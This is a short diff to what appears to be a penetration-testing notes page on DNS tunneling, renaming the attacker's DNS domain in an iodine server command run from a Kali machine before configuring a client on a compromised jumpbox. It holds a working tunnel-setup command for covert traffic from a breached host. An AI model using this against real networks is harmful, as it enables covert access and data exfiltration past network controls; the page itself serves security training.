@@ -10,7 +10,7 @@ DNS Tunneling also known as **TCP over DNS**, where an attacker encapsulates oth
 [iodine](https://github.com/yarrick/iodine) is a C software that lets you tunnel IPv4 data through a DNS server.  
 On the attacking machine we can run the server:
 ```bash
-v4resk@kali$ sudo iodined -f -c -P password 10.1.1.1/24 my.dnsServer.com    
+v4resk@kali$ sudo iodined -f -c -P password 10.1.1.1/24 my.attackingDnsServer.com    
 ```
 On the compromised host, the jumpbox, we will setup the iodine client:
 ```bash
